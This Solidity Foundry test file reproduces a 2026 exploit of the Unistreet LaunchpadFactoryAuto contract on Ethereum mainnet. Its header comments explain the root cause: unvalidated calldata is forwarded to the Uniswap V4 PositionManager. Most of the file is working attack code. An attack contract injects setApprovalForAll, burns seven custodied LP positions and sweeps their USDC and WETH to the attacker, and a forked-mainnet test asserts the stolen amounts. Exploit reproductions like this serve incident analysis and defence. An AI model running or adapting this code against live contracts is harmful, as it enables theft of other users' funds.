// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Unistreet (unistreetsx) LaunchpadFactoryAuto — arbitrary-call injection through unvalidated
// launch() calldata forwarding drains the factory-custodied Uniswap V4 LP positions.
// Ethereum mainnet, 2026-08. ~$17.75K to the attacker EOA in one tx.
//
// Exploit tx : 0x9583e95d5c88c7966e269197f4b09022f26b7a27ad2c13660dda6774e3136d14 (block 25692311)
// Attacker   : 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076
// Victim     : 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825 (LaunchpadFactoryAuto, LP custodian)
// V4 posm    : 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e (PositionManager, holds the launch NFTs)
// V4 PoolMgr : 0x000000000004444c5DC75cB358380D2e3dE08A90
//
// Root cause (verified against the on-chain trace AND the verified LaunchpadFactoryAuto source, NOT
// a key/admin/signer compromise): launch() is `external payable`, fully permissionless, and forwards
// the caller's `initCalldata` and `modifyCalldata` VERBATIM into the V4 PositionManager as the
// factory itself, with no validation on the content:
//
//     bytes[] memory calls = new bytes[](2);
//     calls[0] = initCalldata;
//     calls[1] = modifyCalldata;
//     IPositionManager(POSITION_MANAGER).multicall(calls);   // msg.sender == the factory
//
// posm.multicall self-delegatecalls each entry with msg.sender preserved as the factory, and the
// factory is the ERC721 owner of every launch's LP-position NFT. So the attacker passes
// `modifyCalldata = setApprovalForAll(attacker, true)`, which posm runs as the factory and grants
// the attacker operator rights over EVERY position the factory custodies — including other users'
// launches. The attacker then calls posm.modifyLiquidities directly on each of those positions with
// a BURN_POSITION + TAKE_PAIR action pair, sweeping the underlying tokens to itself.
//
// Reconstructed 1:1 from the trace as ordinary typed calls (no bytecode blob, no raw calldata
// replay of the tx, no redeploy of the original attack contract). The injected payload is built
// here with abi.encodeWithSelector against the real posm signatures so it is visible, not opaque:
//   1. launch() a throwaway token "CPOC" with initCalldata = initializePool(CPOC/WETH) and
//      modifyCalldata = setApprovalForAll(this, true)  <- the injection.
//   2. for each of the 7 factory-custodied victim positions, posm.modifyLiquidities([BURN_POSITION,
//      TAKE_PAIR]) to burn it and take both currencies to this contract.
//   3. forward the swept USDC + WETH to the attacker EOA.
// The seven positions also yield illiquid launch memecoins (e.g. tokenId 360162 "UNISTREET"); those
// are hard to price and are left in the exploit contract, not folded into the USD assertion.
//
// Requires evm_version = cancun: Uniswap V4's PoolManager uses EIP-1153 transient storage.
//
// forge test --contracts src/test/2026-08/UnistreetLaunchpad_exp.sol -vvv

interface ILaunchpadFactoryAuto {
    struct Params {
        string name;
        string symbol;
        uint256 supply;
        address pairedStock;
        uint256 seedAmount;
        bytes32 salt;
        string description;
        string image;
        string website;
        string twitter;
        bool holdersShare;
    }

    struct SeedBuys {
        address payAsset;
        uint256 totalPayIn;
        bytes preCommands;
        bytes[] preInputs;
        uint128[] amounts;
        address[] recipients;
    }

    function launch(
        Params calldata p,
        bytes calldata initCalldata,
        bytes calldata modifyCalldata,
        SeedBuys calldata sb
    ) external payable returns (address token);
    function predict(
        bytes32 salt
    ) external view returns (address);
}

interface IPositionManager {
    function setApprovalForAll(
        address operator,
        bool approved
    ) external;
    function modifyLiquidities(
        bytes calldata unlockData,
        uint256 deadline
    ) external payable;
}

// PoolKey shape the V4 PositionManager.initializePool expects.
struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

contract UnistreetLaunchpadAttack {
    ILaunchpadFactoryAuto internal constant FACTORY = ILaunchpadFactoryAuto(0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825);
    IPositionManager internal constant POSM = IPositionManager(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // initializePool((PoolKey),uint160) selector, and sqrtPriceX96 = 2^96 (a 1:1 start price).
    bytes4 internal constant INITIALIZE_POOL = 0xf7020405;
    uint160 internal constant SQRT_PRICE_1_1 = 79_228_162_514_264_337_593_543_950_336;
    // Uniswap V4 action bytes.
    uint8 internal constant BURN_POSITION = 0x03;
    uint8 internal constant TAKE_PAIR = 0x11;
    // Same salt the incident used; keeps the throwaway CPOC clone below the WETH address so the
    // pool key currency ordering matches, and the clone address is deterministic on (factory, salt).
    bytes32 internal constant SALT = 0xbd28cbac70a00af863747d3d417bf978587d808789d912874b92f6f45c473354;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(
        uint256[] calldata tokenIds,
        address[] calldata cur0,
        address[] calldata cur1
    ) external {
        // 1. Launch a throwaway token, but inject setApprovalForAll(this,true) as modifyCalldata.
        //    The factory forwards it to posm as itself, approving us over all its custodied NFTs.
        address cpoc = FACTORY.predict(SALT);
        PoolKey memory key =
            PoolKey({currency0: cpoc, currency1: WETH, fee: 10_000, tickSpacing: 200, hooks: address(0)});

        bytes memory initCalldata = abi.encodeWithSelector(INITIALIZE_POOL, key, SQRT_PRICE_1_1);
        bytes memory modifyCalldata =
            abi.encodeWithSelector(IPositionManager.setApprovalForAll.selector, address(this), true);

        ILaunchpadFactoryAuto.Params memory p = ILaunchpadFactoryAuto.Params({
            name: "constructor-poc",
            symbol: "CPOC",
            supply: 1_000_000e18,
            pairedStock: WETH,
            seedAmount: 1_000_000e18,
            salt: SALT,
            description: "",
            image: "",
            website: "",
            twitter: "",
            holdersShare: false
        });
        ILaunchpadFactoryAuto.SeedBuys memory sb; // totalPayIn 0 -> no seed buys

        FACTORY.launch(p, initCalldata, modifyCalldata, sb);

        // 2. As the now-approved operator, burn each factory-custodied victim position and take
        //    both of its currencies here.
        for (uint256 i; i < tokenIds.length; i++) {
            bytes memory actions = abi.encodePacked(BURN_POSITION, TAKE_PAIR);
            bytes[] memory params = new bytes[](2);
            params[0] = abi.encode(tokenIds[i], uint128(0), uint128(0), bytes("")); // BURN_POSITION
            params[1] = abi.encode(cur0[i], cur1[i], address(this)); // TAKE_PAIR to us
            POSM.modifyLiquidities(abi.encode(actions, params), block.timestamp + 300);
        }

        // 3. Forward the swept USDC + WETH to the attacker EOA (the memecoins stay here).
        IERC20(USDC).transfer(owner, IERC20(USDC).balanceOf(address(this)));
        IERC20(WETH).transfer(owner, IERC20(WETH).balanceOf(address(this)));
    }
}

contract UnistreetLaunchpadExp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076;
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 internal constant FORK_BLOCK = 25_692_310; // parent of the exploit block 25692311
    uint256 internal constant EXPECTED_USDC = 17_743_907_229; // 17,743.907229 USDC
    uint256 internal constant EXPECTED_WETH = 7_209_570_881_911_319; // 0.007209570881911319 WETH

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825, "LaunchpadFactoryAuto");
        vm.label(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e, "V4PositionManager");
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        // The 7 factory-custodied victim positions and each one's (currency0, currency1).
        uint256[] memory tokenIds = new uint256[](7);
        address[] memory cur0 = new address[](7);
        address[] memory cur1 = new address[](7);
        (tokenIds[0], cur0[0], cur1[0]) = (360_162, 0x3Bf4118F8862857872e6c13f87743Ab05a52Bc7D, address(USDC));
        (tokenIds[1], cur0[1], cur1[1]) = (364_347, address(USDC), 0xAa145d7f316e0EaC3DDb163331CA770F2eb5307f);
        (tokenIds[2], cur0[2], cur1[2]) = (360_385, 0x954727c49CBD6e2432E7Ad7533232b53e2dc81FC, address(WETH));
        (tokenIds[3], cur0[3], cur1[3]) = (363_137, 0xBac02f09e4A734086184064acf885d6C9e686c57, address(WETH));
        (tokenIds[4], cur0[4], cur1[4]) = (363_145, address(WETH), 0xd096a97331331D1eAeBFFb4EDCC48C74D8E04d70);
        (tokenIds[5], cur0[5], cur1[5]) = (363_678, 0x3Fd263E3baDea86b6dAC10f331A60949E75657e6, address(WETH));
        (tokenIds[6], cur0[6], cur1[6]) = (364_293, 0x593Cc7d69be66Fa37746DB9437baD571EE3D36e9, address(WETH));

        uint256 usdcBefore = USDC.balanceOf(ATTACKER);
        uint256 wethBefore = WETH.balanceOf(ATTACKER);

        vm.prank(ATTACKER, ATTACKER);
        UnistreetLaunchpadAttack exploit = new UnistreetLaunchpadAttack();
        exploit.attack(tokenIds, cur0, cur1);

        uint256 usdcGain = USDC.balanceOf(ATTACKER) - usdcBefore;
        uint256 wethGain = WETH.balanceOf(ATTACKER) - wethBefore;
        emit log_named_decimal_uint("attacker USDC gain", usdcGain, 6);
        emit log_named_decimal_uint("attacker WETH gain", wethGain, 18);

        // Core assertion: USDC + WETH swept out of the custodied positions, to the wei.
        assertApproxEqAbs(usdcGain, EXPECTED_USDC, 1e6, "USDC gain off expected ~17,743.91");
        assertApproxEqAbs(wethGain, EXPECTED_WETH, 1e14, "WETH gain off expected ~0.00721");
    }
}
